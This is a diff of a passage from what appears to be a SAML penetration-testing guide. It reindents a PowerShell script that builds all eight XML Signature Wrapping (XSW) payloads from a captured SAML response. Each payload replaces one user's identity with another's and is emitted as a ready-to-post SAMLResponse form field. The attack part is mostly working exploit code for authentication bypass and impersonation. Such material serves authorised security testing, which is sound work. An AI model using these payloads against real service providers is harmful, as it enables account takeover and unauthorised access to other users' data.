@@ -83,92 +83,92 @@
 * **Assertion-signed baseline:** retain the original signed assertion unchanged with its original ID and signature reference. Add a second, unsigned assertion with a new ID and B's identity. Try it before and after the signed assertion; then test the nesting/wrapper variants above.
 * **Generate all eight payloads from a real response (PowerShell 7, Windows / Linux):** save the decoded original as `response.xml`; change the two identity values below. The generator changes exact matches in `NameID` and email attributes; replace the email attribute name in the XPath with the actual consumed attribute name if different. No IdP private key is needed for wrapping.
   * ```powershell
-  $baselineXml = Get-Content -Raw -Encoding utf8 './response.xml'
-  $originalIdentity = 'user-a@example.com'
-  $replacementIdentity = 'user-b@example.com'
-  $samlXsw = [ordered]@{}
+    $baselineXml = Get-Content -Raw -Encoding utf8 './response.xml'
+    $originalIdentity = 'user-a@example.com'
+    $replacementIdentity = 'user-b@example.com'
+    $samlXsw = [ordered]@{}
 
-  foreach ($variant in 1..8) {
-    $document = [System.Xml.XmlDocument]::new()
-    $document.PreserveWhitespace = $true
-    $document.XmlResolver = $null
-    $document.LoadXml($baselineXml)
-    $namespaces = [System.Xml.XmlNamespaceManager]::new($document.NameTable)
-    $namespaces.AddNamespace('saml', 'urn:oasis:names:tc:SAML:2.0:assertion')
-    $namespaces.AddNamespace('ds', 'http://www.w3.org/2000/09/xmldsig#')
-    $response = $document.DocumentElement
-    if ($response.LocalName -ne 'Response') { throw 'Expected a SAML Response root' }
-    $target = if ($variant -le 2) { $response } else {
-      $response.SelectSingleNode('./saml:Assertion', $namespaces)
-    }
-    if ($null -eq $target) { continue }
-    $signature = $target.SelectSingleNode('./ds:Signature', $namespaces)
-    if ($null -eq $signature) { continue }
-    $targetId = $target.GetAttribute('ID')
-    $references = @($signature.SelectNodes('./ds:SignedInfo/ds:Reference', $namespaces))
-    if (-not $targetId -or -not ($references | Where-Object {
-      $_.GetAttribute('URI') -ceq "#$targetId"
-    })) { continue }
+    foreach ($variant in 1..8) {
+      $document = [System.Xml.XmlDocument]::new()
+      $document.PreserveWhitespace = $true
+      $document.XmlResolver = $null
+      $document.LoadXml($baselineXml)
+      $namespaces = [System.Xml.XmlNamespaceManager]::new($document.NameTable)
+      $namespaces.AddNamespace('saml', 'urn:oasis:names:tc:SAML:2.0:assertion')
+      $namespaces.AddNamespace('ds', 'http://www.w3.org/2000/09/xmldsig#')
+      $response = $document.DocumentElement
+      if ($response.LocalName -ne 'Response') { throw 'Expected a SAML Response root' }
+      $target = if ($variant -le 2) { $response } else {
+        $response.SelectSingleNode('./saml:Assertion', $namespaces)
+      }
+      if ($null -eq $target) { continue }
+      $signature = $target.SelectSingleNode('./ds:Signature', $namespaces)
+      if ($null -eq $signature) { continue }
+      $targetId = $target.GetAttribute('ID')
+      $references = @($signature.SelectNodes('./ds:SignedInfo/ds:Reference', $namespaces))
+      if (-not $targetId -or -not ($references | Where-Object {
+        $_.GetAttribute('URI') -ceq "#$targetId"
+      })) { continue }
 
-    $original = $target.CloneNode($true)
-    $unsigned = $target.CloneNode($true)
-    [void]$unsigned.RemoveChild($unsigned.SelectSingleNode('./ds:Signature', $namespaces))
-    $unsigned.SetAttribute('ID', "_xsw${variant}_unsigned")
-    $changed = if ($variant -in 3, 4, 7) { $unsigned } else { $target }
-    $identityNodes = $changed.SelectNodes(
-      './/saml:NameID | .//saml:Attribute[@Name="email"]/saml:AttributeValue',
-      $namespaces
-    )
-    $matches = 0
-    foreach ($identityNode in $identityNodes) {
-      if ($identityNode.InnerText -ceq $originalIdentity) {
-        $identityNode.InnerText = $replacementIdentity
-        $matches++
+      $original = $target.CloneNode($true)
+      $unsigned = $target.CloneNode($true)
+      [void]$unsigned.RemoveChild($unsigned.SelectSingleNode('./ds:Signature', $namespaces))
+      $unsigned.SetAttribute('ID', "_xsw${variant}_unsigned")
+      $changed = if ($variant -in 3, 4, 7) { $unsigned } else { $target }
+      $identityNodes = $changed.SelectNodes(
+        './/saml:NameID | .//saml:Attribute[@Name="email"]/saml:AttributeValue',
+        $namespaces
+      )
+      $matches = 0
+      foreach ($identityNode in $identityNodes) {
+        if ($identityNode.InnerText -ceq $originalIdentity) {
+          $identityNode.InnerText = $replacementIdentity
+          $matches++
+        }
+      }
+      if ($matches -eq 0) { throw "XSW${variant}: original identity not found; adjust values/XPath" }
+      if ($variant -in 1, 2, 5, 6) { $target.SetAttribute('ID', "_xsw${variant}_unsigned") }
+      if ($variant -in 1, 2, 5, 6, 8) {
+        [void]$original.RemoveChild($original.SelectSingleNode('./ds:Signature', $namespaces))
+      }
+      switch ($variant) {
+        1 { [void]$signature.AppendChild($original) }
+        2 { [void]$target.InsertBefore($original, $signature) }
+        3 { [void]$response.InsertBefore($unsigned, $target) }
+        4 {
+          [void]$response.AppendChild($unsigned)
+          [void]$unsigned.AppendChild($target)
+        }
+        5 { [void]$response.AppendChild($original) }
+        6 { [void]$signature.AppendChild($original) }
+        7 {
+          $unsigned.SetAttribute('ID', $targetId)
+          $extensions = $document.CreateElement('Extensions')
+          [void]$response.InsertBefore($extensions, $target)
+          [void]$extensions.AppendChild($unsigned)
+        }
+        8 {
+          $object = $document.CreateElement('Object')
+          [void]$signature.AppendChild($object)
+          [void]$object.AppendChild($original)
+        }
+      }
+      $xml = $document.OuterXml
+      $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($xml))
+      $samlXsw["XSW$variant"] = [pscustomobject]@{
+        Xml = $xml
+        Base64 = $base64
+        FormField = 'SAMLResponse=' + [Uri]::EscapeDataString($base64)
       }
     }
-    if ($matches -eq 0) { throw "XSW${variant}: original identity not found; adjust values/XPath" }
-    if ($variant -in 1, 2, 5, 6) { $target.SetAttribute('ID', "_xsw${variant}_unsigned") }
-    if ($variant -in 1, 2, 5, 6, 8) {
-      [void]$original.RemoveChild($original.SelectSingleNode('./ds:Signature', $namespaces))
-    }
-    switch ($variant) {
-      1 { [void]$signature.AppendChild($original) }
-      2 { [void]$target.InsertBefore($original, $signature) }
-      3 { [void]$response.InsertBefore($unsigned, $target) }
-      4 {
-        [void]$response.AppendChild($unsigned)
-        [void]$unsigned.AppendChild($target)
-      }
-      5 { [void]$response.AppendChild($original) }
-      6 { [void]$signature.AppendChild($original) }
-      7 {
-        $unsigned.SetAttribute('ID', $targetId)
-        $extensions = $document.CreateElement('Extensions')
-        [void]$response.InsertBefore($extensions, $target)
-        [void]$extensions.AppendChild($unsigned)
-      }
-      8 {
-        $object = $document.CreateElement('Object')
-        [void]$signature.AppendChild($object)
-        [void]$object.AppendChild($original)
-      }
-    }
-    $xml = $document.OuterXml
-    $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($xml))
-    $samlXsw["XSW$variant"] = [pscustomobject]@{
-      Xml = $xml
-      Base64 = $base64
-      FormField = 'SAMLResponse=' + [Uri]::EscapeDataString($base64)
-    }
-  }
-  $samlXsw.Keys
-  ```
+    $samlXsw.Keys
+    ```
 * **Use one generated variant:** `.Xml` is decoded XML for inspection; `.Base64` is the form parameter value; `.FormField` is the encoded name/value pair for a raw POST body. Replace only the original `SAMLResponse` pair and retain the transaction's other form fields. This is POST-binding output, not Redirect-binding DEFLATE output.
   * ```powershell
-  $samlXsw['XSW3'].Xml
-  $samlXsw['XSW3'].Base64
-  $samlXsw['XSW3'].FormField
-  ```
+    $samlXsw['XSW3'].Xml
+    $samlXsw['XSW3'].Base64
+    $samlXsw['XSW3'].FormField
+    ```
 * **Skipped variants:** absent keys mean the input lacks that signed layer or a same-element `#ID` reference. An encrypted assertion needs decryption first. To test signatures independently when both layers exist, use the matching baseline/variant; the generator does not repair the outer signature.
 * **Signature check:** the generator retains original signature values and reference IDs; it does not re-sign or guarantee a valid digest after XML serialization/relocation. Compare the signed subtree's namespaces and transforms if the SP reports a digest failure. Do not repair it with your own key, which would turn this into a certificate-trust test.
 * **Response-signed baseline:** adding children normally breaks the response signature. Use wrapping variants that retain the referenced signed response subtree while exposing a separate application-consumed node; do not treat a broken outer signature as a working XSW PoC.
